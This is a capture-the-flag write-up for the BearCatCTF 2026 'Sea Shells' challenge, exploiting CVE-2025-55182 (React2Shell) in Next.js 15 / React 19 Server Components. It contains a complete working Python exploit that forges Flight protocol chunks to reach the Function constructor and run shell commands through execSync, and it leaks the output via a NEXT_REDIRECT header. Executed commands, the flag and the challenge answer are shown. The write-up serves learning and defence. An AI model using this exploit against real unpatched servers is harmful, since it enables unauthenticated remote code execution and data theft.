---
title: "BearCatCTF 2026 - Sea Shells"
slug: bearcatctf-2026-sea-shells
excerpt: "Exploiting CVE-2025-55182 (React2Shell) — a critical insecure deserialization flaw in the React Server Components Flight protocol leading to unauthenticated RCE"
coverImage: "https://images.unsplash.com/photo-1544197150-b99a580bb7a8?w=800"
coverImageAlt: "BearCatCTF 2026 - Sea Shells CTF writeup"
categories:
  - Web
  - RCE
  - React
  - Next.js
  - CVE
  - Deserialization
  - CTF
date: 2026-02-22
showToc: true
---

## Challenge Information

| Field | Value |
|-------|-------|
| **Name** | Sea Shells |
| **CTF** | BearCatCTF 2026 |
| **Category** | Web |
| **Points** | 460 |
| **Author** | Hugh |
| **Flag** | `BCCTF{R34c7_S3rv3r_C0mp0n3n7s_RCE_2025}` |

## Challenge Description

> Ahoy, Code-Breakers!
>
> The Dread Captain Next thinks his fortress is impenetrable, but he's left the ship's articles—the very blueprints of how his crew behaves—unguarded. We've heard whispers that if a clever pirate can poison the source they can rewrite the fundamental laws of the ship itself.
>
> Forging your Next-Action scrolls is the key to mutiny. When you control the prototype, the crew stops listening to the Captain and starts listening to you. Seize the shell, and the flag shall be yours!

Target: `http://chal.bearcatctf.io:38270/`

## TL;DR

The challenge runs a **Next.js 15.0.0** app with **React 19.0.0-rc** — a version vulnerable to **CVE-2025-55182 (React2Shell)**. This is a critical insecure deserialization flaw in the React Server Components Flight protocol that allows unauthenticated RCE. We craft a malicious multipart payload that abuses the Flight decoder to create fake "Thenable" (Promise-like) objects, which triggers arbitrary JavaScript execution on the server when `await`ed.

---

## Recon

Hitting the target gives us a simple journal/log book app — you can submit entries with a title and content. Inspecting the page source and static JS bundles reveals the stack:

- **Next.js 15.0.0** (Build ID: `V_NSvClZKyL3arBuCiH4R`)
- **React 19.0.0-rc** (`rc-f994737d14-20240522`)
- App Router with React Server Components (RSC)
- A single **Server Action** with ID `3fee78e8995a129cd1c598459b0203a43f700478`

The challenge description is full of hints:
- *"Next-Action scrolls"* → Server Action requests (the `Next-Action` HTTP header)
- *"poison the source"* / *"control the prototype"* → Prototype Pollution
- *"Seize the shell"* → RCE

## Understanding the Attack Surface

### React Flight Protocol

When a Next.js app uses Server Actions, the client communicates with the server via the **React Flight protocol**. Requests are sent as `multipart/form-data` with a `Next-Action` header containing the action ID. The form fields encode serialized JavaScript values using a custom format with `$`-prefixed type tags:

| Prefix | Meaning |
|--------|---------|
| `$1` | Reference to chunk with key "1" |
| `$@1` | Reference to chunk 1 as a **Thenable** (Promise-like) |
| `$B1` | "Block" / lazy reference |
| `$K1` | FormData reference |
| `$Q1` | Map reference |

The server deserializes these into live JavaScript objects. This is where the vulnerability lives.

### CVE-2025-55182 — React2Shell

Discovered by Lachlan Davidson in late 2025, this CVSS 10.0 vulnerability exists in `react-server-dom-webpack` (and the turbopack/parcel variants). The Flight decoder reconstructs objects from the serialized format **without proper validation**, allowing an attacker to:

1. Create fake **Chunk** objects with controlled `status`, `value`, `_response`, etc.
2. Use `$@` references to obtain real Chunk objects and graft their `.then` method onto attacker-controlled objects
3. Abuse the `_response._formData.get` → `constructor.constructor` chain to reach the **Function constructor**
4. Execute arbitrary JavaScript when the server tries to `await` the fake Thenable

## Building the Exploit

The payload creates a chain of fake objects that trick the Flight decoder:

```python
payload = {
    '0': '$1',          # Model: reference to chunk 1
    '1': {              # Fake Chunk object
        'status': 'resolved_model',
        'reason': 0,
        '_response': '$4',
        'value': '{"then":"$3:map","0":{"then":"$B3"},"length":1}',
        'then': '$2:then'    # Borrow .then from a real Chunk
    },
    '2': '$@3',         # $@ gives us a real Chunk (Thenable)
    '3': [],            # Empty array (used for constructor chain)
    '4': {              # Fake Response object
        '_prefix': '<MALICIOUS JS CODE>//',
        '_formData': {
            'get': '$3:constructor:constructor'  # [] → Array → Function
        },
        '_chunks': '$2:_response:_chunks',
    }
}
```

**How the chain works:**

1. **Chunk 0** (`$1`) references Chunk 1 — the fake Chunk
2. **Chunk 2** (`$@3`) creates a real Thenable reference to Chunk 3, giving us access to a genuine `.then` method
3. **Chunk 1** steals `.then` from the real Chunk via `'$2:then'`, making itself look like a Promise
4. When the server tries to `await` Chunk 1, it calls `.then()`, which re-enters the parser with our controlled `_response`
5. **Chunk 4** (the fake Response) has `_formData.get` pointing to `$3:constructor:constructor` — that's `[].constructor.constructor` = the **Function constructor**
6. The `_prefix` field is prepended to the code string passed to `Function()`, giving us **arbitrary code execution**

### Data Exfiltration via Redirect

To get command output back, we abuse Next.js's built-in redirect handling. By throwing a specially formatted `NEXT_REDIRECT` error, the server responds with a 303 redirect containing our data in the URL:

```javascript
throw Object.assign(new Error('NEXT_REDIRECT'), {
  digest: 'NEXT_REDIRECT;push;/login?a=' + encodeURIComponent(output) + ';307;'
});
```

The command output appears in the `X-Action-Redirect` response header.

## The Exploit Script

```python
import http.client, json, re, urllib.parse

TARGET = "chal.bearcatctf.io"
PORT = 38270
ACTION_ID = "3fee78e8995a129cd1c598459b0203a43f700478"

def send_rce(cmd):
    cmd_escaped = cmd.replace("'", "\\'")

    # JS code: run command, exfiltrate output via redirect
    js = (
        f"throw Object.assign(new Error('NEXT_REDIRECT'),"
        f"{{digest: 'NEXT_REDIRECT;push;/login?a=' + "
        f"encodeURIComponent(process.mainModule.require('child_process')"
        f".execSync('{cmd_escaped}').toString()) + ';307;'}});//"
    )

    payload = {
        '0': '$1',
        '1': {
            'status': 'resolved_model', 'reason': 0,
            '_response': '$4',
            'value': '{"then":"$3:map","0":{"then":"$B3"},"length":1}',
            'then': '$2:then'
        },
        '2': '$@3',
        '3': [],
        '4': {
            '_prefix': js,
            '_formData': {'get': '$3:constructor:constructor'},
            '_chunks': '$2:_response:_chunks',
        }
    }

    BOUNDARY = "----Boundary"
    body = b""
    for key in sorted(payload.keys()):
        body += f"--{BOUNDARY}\r\n".encode()
        body += f'Content-Disposition: form-data; name="{key}"\r\n\r\n'.encode()
        body += f"{json.dumps(payload[key])}\r\n".encode()
    body += f"--{BOUNDARY}--\r\n".encode()

    conn = http.client.HTTPConnection(TARGET, PORT, timeout=15)
    conn.request("POST", "/", body, {
        "Content-Type": f"multipart/form-data; boundary={BOUNDARY}",
        "Next-Action": ACTION_ID,
    })
    resp = conn.getresponse()
    redirect = dict(resp.getheaders()).get('x-action-redirect', '')
    body_text = resp.read().decode(errors='replace')
    match = re.search(r'[?&]a=([^;&]+)', redirect + body_text)
    return urllib.parse.unquote(match.group(1)) if match else None

# Pop a shell
print(send_rce("id"))
# uid=100(ctf) gid=101(ctf) groups=101(ctf),101(ctf)

print(send_rce("cat /app/flag.txt"))
# BCCTF{R34c7_S3rv3r_C0mp0n3n7s_RCE_2025}
```

## Execution

```
$ python3 exploit.py
uid=100(ctf) gid=101(ctf) groups=101(ctf),101(ctf)
BCCTF{R34c7_S3rv3r_C0mp0n3n7s_RCE_2025}
```

## Flag

```
BCCTF{R34c7_S3rv3r_C0mp0n3n7s_RCE_2025}
```

## References

- [CVE-2025-55182 — React Server Components RCE](https://react.dev/blog/2025/12/03/critical-security-vulnerability-in-react-server-components)
- [CVE-2025-66478 — Next.js Security Advisory](https://nextjs.org/blog/CVE-2025-66478)
- [React2Shell — Lachlan Davidson's Original PoC](https://github.com/lachlan2k/React2Shell-CVE-2025-55182-original-poc)
- [Tenable — React2Shell FAQ](https://www.tenable.com/blog/react2shell-cve-2025-55182-react-server-components-rce)

---

*Writeup by daryx*
